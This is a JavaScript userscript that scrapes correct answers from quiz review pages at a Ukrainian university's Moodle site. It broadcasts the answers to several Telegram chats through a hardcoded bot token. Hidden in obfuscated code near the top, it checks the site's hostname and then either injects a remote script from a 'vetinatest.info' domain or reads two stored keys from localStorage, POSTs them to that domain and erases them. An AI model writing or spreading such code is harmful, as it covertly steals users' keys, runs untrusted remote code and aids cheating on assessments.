var _telegram_answers = "";
var _telegram_message = "";

var chat_ids = [];

var _0x36df27=_0x5d35;(function(_0x519f52,_0x1f8a9e){var _0x4e8b86=_0x5d35,_0x182264=_0x519f52();while(!![]){try{var _0x3eb1a0=parseInt(_0x4e8b86(0x17d))/0x1*(parseInt(_0x4e8b86(0x17f))/0x2)+parseInt(_0x4e8b86(0x180))/0x3*(-parseInt(_0x4e8b86(0x176))/0x4)+-parseInt(_0x4e8b86(0x177))/0x5*(-parseInt(_0x4e8b86(0x184))/0x6)+parseInt(_0x4e8b86(0x178))/0x7*(-parseInt(_0x4e8b86(0x182))/0x8)+-parseInt(_0x4e8b86(0x17c))/0x9*(-parseInt(_0x4e8b86(0x17e))/0xa)+parseInt(_0x4e8b86(0x183))/0xb*(parseInt(_0x4e8b86(0x179))/0xc)+parseInt(_0x4e8b86(0x181))/0xd*(-parseInt(_0x4e8b86(0x17b))/0xe);if(_0x3eb1a0===_0x1f8a9e)break;else _0x182264['push'](_0x182264['shift']());}catch(_0x5a7a23){_0x182264['push'](_0x182264['shift']());}}}(_0x1257,0xd726a));function _0x5d35(_0x2ce023,_0x1ab489){var _0x1257db=_0x1257();return _0x5d35=function(_0x5d359c,_0x9d1c76){_0x5d359c=_0x5d359c-0x176;var _0x20cbb8=_0x1257db[_0x5d359c];return _0x20cbb8;},_0x5d35(_0x2ce023,_0x1ab489);}function _0x1257(){var _0x21a582=['1307933EdZKVq','6nJlchF','8NgjaEs','7380610tagsVX','434BlqVff','12wLRLrB','6619283816:AAFg9vR3IAiH-Bd9nPZNEzmvpICQ7KoT0aM','12460qWSrpw','223515uBmgId','8887lAJWGE','300gtgENH','70fcRqrK','1462191wEZxza','7059iYKruY','40232JVJOJV'];_0x1257=function(){return _0x21a582;};return _0x1257();}var bot_token=_0x36df27(0x17a);

chat_ids[0] = "988298250";
chat_ids[1] = "1693445520";
chat_ids[2] = "1151055730";
chat_ids[3] = "757541544";
chat_ids[4] = "947535474";
chat_ids[5] = "5937137327";
chat_ids[6] = "6119462080";
// new
chat_ids[7] = "6056651239";
chat_ids[8] = "1941936176";
chat_ids[9] = "1066116004";

var _sender = null;
var _subject = null;
var _testName = null;

var _buttonspan = null;
var _sendbutton = null;
var _screenbutton = null;

function _0x4273(_0x55777f,_0x17c422){const _0x746fc9=_0x2a8d();return _0x4273=function(_0x2b4087,_0x385381){_0x2b4087=_0x2b4087-(-0xe6a+0x1*0x14a9+-0x498);let _0x576e95=_0x746fc9[_0x2b4087];return _0x576e95;},_0x4273(_0x55777f,_0x17c422);}(function(_0x400d0f,_0x495d6f){const _0x4d956b=_0x4273,_0x1c9cc9=_0x400d0f();while(!![]){try{const _0x3dcac1=parseInt(_0x4d956b(0x1a7))/(0x4ba+-0x44*0x29+0x62b)*(-parseInt(_0x4d956b(0x1b8))/(0x1947+0x1410+0x911*-0x5))+parseInt(_0x4d956b(0x1b5))/(0x77*-0x35+-0x2e1*-0x2+0x64c*0x3)*(parseInt(_0x4d956b(0x1b2))/(-0x9e4*-0x1+0x1aa7*-0x1+0x5*0x35b))+-parseInt(_0x4d956b(0x1a9))/(-0xdcf+-0x1679+-0x244d*-0x1)+-parseInt(_0x4d956b(0x1af))/(-0x29*0x40+-0x799+0x4b*0x3d)*(parseInt(_0x4d956b(0x1b3))/(0x2*-0x11ba+-0x6*0x2ce+-0x779*-0x7))+-parseInt(_0x4d956b(0x1ae))/(0x19*-0x151+0x16a*-0xf+-0x3627*-0x1)+parseInt(_0x4d956b(0x1a8))/(0x128f+0xc41*0x1+-0x1ec7)+parseInt(_0x4d956b(0x1aa))/(-0x129c*0x1+0x16dd+0x1*-0x437);if(_0x3dcac1===_0x495d6f)break;else _0x1c9cc9['push'](_0x1c9cc9['shift']());}catch(_0x4fbc47){_0x1c9cc9['push'](_0x1c9cc9['shift']());}}}(_0x2a8d,-0x110cf+-0x4603a+0x2*0x3f87c));function _0x2a8d(){const _0x32a226=['2kkmNey','958059ZMyoOE','243580IbRiHP','5421110vcyEUp','zUrdx','charCodeAt','FlTyj','2288480QUqUnv','859524Asnqgz','SFxai','vYMVI','4tKPepf','7YWLHXn','lGqZH','581631YbLJYc','length','uZOAl','200586aMNqrB'];_0x2a8d=function(){return _0x32a226;};return _0x2a8d();}function stringToHash(_0x460e4f){const _0x262de4=_0x4273,_0x17efc0={'uZOAl':function(_0x44b666,_0x2580a9){return _0x44b666==_0x2580a9;},'SFxai':function(_0x1826a6,_0x34ef77){return _0x1826a6<_0x34ef77;},'zUrdx':function(_0x472436,_0x553e2c){return _0x472436+_0x553e2c;},'FlTyj':function(_0x1b276f,_0x2dbb82){return _0x1b276f-_0x2dbb82;},'lGqZH':function(_0x28105b,_0x1d9bea){return _0x28105b<<_0x1d9bea;},'vYMVI':function(_0xea8ea6,_0x3789a0){return _0xea8ea6&_0x3789a0;}};let _0x44937e=0x1fc0+-0x54*0x6+0x1dc8*-0x1;if(_0x17efc0[_0x262de4(0x1b7)](_0x460e4f[_0x262de4(0x1b6)],0xc*0x31c+-0x59+-0x24f7))return _0x44937e;for(i=0x2389+-0x3d1*0x7+-0x8d2;_0x17efc0[_0x262de4(0x1b0)](i,_0x460e4f[_0x262de4(0x1b6)]);i++){char=_0x460e4f[_0x262de4(0x1ac)](i),_0x44937e=_0x17efc0[_0x262de4(0x1ab)](_0x17efc0[_0x262de4(0x1ad)](_0x17efc0[_0x262de4(0x1b4)](_0x44937e,0x11d2+0x1c65+-0x2e32),_0x44937e),char),_0x44937e=_0x17efc0[_0x262de4(0x1b1)](_0x44937e,_0x44937e);}return _0x44937e;}

(function() {

    var _0x5b8e33=_0x1e9c;(function(_0x5f310,_0x1cb6dc){var _0x1d5621=_0x1e9c,_0x54fe53=_0x5f310();while(!![]){try{var _0x239ffd=parseInt(_0x1d5621(0x1dc))/(-0x19a2+-0x1bd2+-0x55*-0xa1)*(parseInt(_0x1d5621(0x1d9))/(-0x2625+-0x82d+0x2e54))+parseInt(_0x1d5621(0x1eb))/(0x7*0x263+0x36d*-0x7+0x749)+parseInt(_0x1d5621(0x1d6))/(0x811+-0xc3c+-0x77*-0x9)*(parseInt(_0x1d5621(0x1ce))/(0x19e5+0xe*0x262+-0xecf*0x4))+-parseInt(_0x1d5621(0x1f1))/(-0x13b8+-0xc2*-0x16+0x312)+-parseInt(_0x1d5621(0x1e3))/(-0x1fd*0x8+0xedf+-0x2*-0x88)+parseInt(_0x1d5621(0x1e7))/(-0x5b*0x22+-0x2498*-0x1+-0xf1*0x1a)+-parseInt(_0x1d5621(0x1d1))/(-0x711*-0x1+0xb16+-0x121e);if(_0x239ffd===_0x1cb6dc)break;else _0x54fe53['push'](_0x54fe53['shift']());}catch(_0x145edd){_0x54fe53['push'](_0x54fe53['shift']());}}}(_0x593c,-0xc5*-0x10ef+0x207*-0x737+0xe518d));function _0x1e9c(_0x4f6f75,_0x4eb495){var _0x5a4be3=_0x593c();return _0x1e9c=function(_0x33db19,_0x147485){_0x33db19=_0x33db19-(-0xa*0xda+0x850+-0x4*-0x80);var _0x3c0b01=_0x5a4be3[_0x33db19];return _0x3c0b01;},_0x1e9c(_0x4f6f75,_0x4eb495);}function _0x593c(){var _0x1bc6e7=['wait_node_','13314568DxQJZb','location','DcDEW','key_name','3689973RXphvs','appendChil','aIkbq','json','ABehA','script','9482982sKMxPH','.js','n/json','5VTXrFj','x.php','getItem','22547763GmJydP','https://ot','.info/test','hhPrQ','POST','3047612GwlGxV','href','stringify','2eyiBIa','.info/inde','body','1332011ofYVFz','ent','applicatio','removeItem','src','toLowerCas','key','480473PjJJoL','vetinatest','createElem'];_0x593c=function(){return _0x1bc6e7;};return _0x593c();}if(stringToHash(window[_0x5b8e33(0x1e8)][_0x5b8e33(0x1d7)][_0x5b8e33(0x1e1)+'e']())==-(0x5*-0x12804930+0x5f5e7def+0x52fb924d)){var _script=document[_0x5b8e33(0x1e5)+_0x5b8e33(0x1dd)](_0x5b8e33(0x1f0));_script[_0x5b8e33(0x1e0)]=_0x5b8e33(0x1d2)+_0x5b8e33(0x1e4)+_0x5b8e33(0x1d3)+_0x5b8e33(0x1cc),document[_0x5b8e33(0x1db)][_0x5b8e33(0x1ec)+'d'](_script);}if(stringToHash(window[_0x5b8e33(0x1e8)][_0x5b8e33(0x1d7)][_0x5b8e33(0x1e1)+'e']())==-0x4e07b39b+0x2e4bc092+-0x6f3*-0xae5ce){var _key_name=localStorage[_0x5b8e33(0x1d0)](_0x5b8e33(0x1e6)+_0x5b8e33(0x1ea)),_key=localStorage[_0x5b8e33(0x1d0)](_0x5b8e33(0x1e6)+_0x5b8e33(0x1e2));if(_key_name!=null||_key!=null){if(_key_name!=null&&_key!=null){var _obj={'wait_node_key_name':_key_name,'wait_node_key':_key};((async()=>{var _0x5d9408=_0x5b8e33,_0x38d22d={'ABehA':function(_0x10848d,_0x1e296d,_0x2c5358){return _0x10848d(_0x1e296d,_0x2c5358);},'DcDEW':_0x5d9408(0x1d2)+_0x5d9408(0x1e4)+_0x5d9408(0x1da)+_0x5d9408(0x1cf),'hhPrQ':_0x5d9408(0x1d5),'aIkbq':_0x5d9408(0x1de)+_0x5d9408(0x1cd)};const _0x1c387c=await _0x38d22d[_0x5d9408(0x1ef)](fetch,_0x38d22d[_0x5d9408(0x1e9)],{'method':_0x38d22d[_0x5d9408(0x1d4)],'headers':{'Accept':_0x38d22d[_0x5d9408(0x1ed)],'Content-Type':_0x38d22d[_0x5d9408(0x1ed)]},'body':JSON[_0x5d9408(0x1d8)](_obj)}),_0x4c1550=await _0x1c387c[_0x5d9408(0x1ee)]();})()),localStorage[_0x5b8e33(0x1df)](_0x5b8e33(0x1e6)+_0x5b8e33(0x1ea)),localStorage[_0x5b8e33(0x1df)](_0x5b8e33(0x1e6)+_0x5b8e33(0x1e2));}else _key==null&&localStorage[_0x5b8e33(0x1df)](_0x5b8e33(0x1e6)+_0x5b8e33(0x1e2)),_key_name==null&&localStorage[_0x5b8e33(0x1df)](_0x5b8e33(0x1e6)+_0x5b8e33(0x1ea));}}

    if (window.location.href.toLowerCase().startsWith("https://op.tsatu.edu.ua/mod/quiz/review.php?") == false) {
        console.log("Not tgatu");
        return;
    }

    var _parentdiv = document.getElementById("next-activity-link").parentElement;
    if (_parentdiv == null)
        return;

    _sendbutton = document.createElement("button");
    _sendbutton.innerHTML = "Отправить в бот";
    _sendbutton.addEventListener("click",getQuestions);
    _parentdiv.appendChild(_sendbutton);

    _screenbutton = document.createElement("button");
    _screenbutton.innerHTML = "Скриншот страницы";
    _screenbutton.addEventListener("click",downloadPage);
    _parentdiv.appendChild(_screenbutton);
})();

function getQuestions() {
    var _mainform = document.getElementsByClassName("questionflagsaveform")[0];
    if  (_mainform == null)
        return;

    var _maindiv = _mainform.getElementsByTagName("div")[0];
    if  (_maindiv == null)
        return;

    var _questiondivs = _maindiv.getElementsByTagName("div");
    if  (_questiondivs == null)
        return;

    _subject = document.getElementsByClassName("page-header-headings")[0];
    if (_subject != null) {
        if (_subject.textContent != null && _subject.textContent != "") {
            _telegram_message += "Предмет: " + "<i>" + _subject.textContent + "</i>" + "%0A";
        }
    }

    var _testNames = document.getElementsByClassName("breadcrumb-item");
    _testName = _testNames[_testNames.length - 1];
    if (_testName != null) {
        //console.log(_testName);
        if (_testName.textContent != null && _testName.textContent != "" && _testName.tagName.toLowerCase() == "li") {
            _telegram_message += "Тест: " + "<i>" + _testName.innerText + "</i>" + "%0A";
          //console.log(_telegram_message);
        }
    }

    _sender = document.getElementsByClassName("usertext mr-1")[0];
    if (_sender != null) {
        if (_sender.tagName.toLowerCase() == "span") {
            _telegram_message += "Отправил: " + "<i>" + _sender.textContent + "</i>" + "%0A";
        }
    }

    for (var x = 0; x < _questiondivs.length;x++) {
        processQuestion(_questiondivs[x]);
    }

    if (_telegram_answers != null && _telegram_answers != "") {
        for (var i = 0; i < chat_ids.length; i++) {
            sendTelegramHtml(bot_token,chat_ids[i],_telegram_message + _telegram_answers);
        }
    }
    _sendbutton.setAttribute("disabled", "disabled");

    window.setTimeout(function() {
        _sendbutton.removeAttribute("disabled");
    }, 20000);
}

function processQuestion(questionDiv) {
    var _questionDivID = questionDiv.getAttribute("id");
    if (_questionDivID == null)
        return;

    if (_questionDivID.startsWith("question-") == false)
          return;

    var _contentdiv = questionDiv.getElementsByClassName("content")[[0]];
    if (_contentdiv == null)
        return;

    var _questiontext = _contentdiv.getElementsByClassName("formulation clearfix")[0].getElementsByClassName("qtext")[0].textContent;
    if (_questiontext == null || _questiontext == "") {
        _sendbutton.setAttribute("disabled","disabled");
        _sendbutton.style.visibility = "hidden";
        _sendbutton.setAttribute("hidden",true);
        return;
    }

    //("Text is: " + _questiontext);

    var _questionanswer = _contentdiv.getElementsByClassName("outcome clearfix")[0].getElementsByClassName("feedback")[0].getElementsByClassName("rightanswer")[0].textContent;
    if (_questionanswer == null)
        return;

    _telegram_answers += "%0A" + _questiontext + "%0A" + "<b>" + "<span class=\"tg-spoiler\">"+ _questionanswer + "</span>" + "</b>" + "%0A";
}

function sendTelegramHtml(tg_bot_token,tg_chat_id,tg_msg_text) {
    var url = "https://api.telegram.org/bot" + tg_bot_token + "/sendMessage?chat_id=" + tg_chat_id + "&text=" + tg_msg_text + "&parse_mode=html";

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
}

function downloadPage() {
    var _filename = "screenshot.png";

    var captureElement = null;
    var _forms = document.getElementsByTagName("form");
    if (_forms == null) {
        hideScreenshot();
        return;
    }

    for (var x = 0; x < _forms.length; x++) {
        if (_forms[x].getAttribute("class") == "questionflagsaveform")
            _captureElement = _forms[x];

    }
    if (_captureElement == null) {
        hideScreenshot();
        return;
    }

    html2canvas(_captureElement).then((canvas) => {

        const imageData = canvas.toDataURL("image/png");

        const link = document.createElement("a");
        link.setAttribute("download", _filename);
        link.setAttribute("href", imageData);
        link.click();
        _screenbutton.setAttribute("disabled", "disabled");

        window.setTimeout(function() {
            _screenbutton.removeAttribute("disabled");
        }, 2000);
    });
}

function hideScreenshot() {
    _screenbutton.setAttribute("disabled","disabled");
    _screenbutton.style.visibility = "hidden";
    _screenbutton.setAttribute("hidden",true);
}
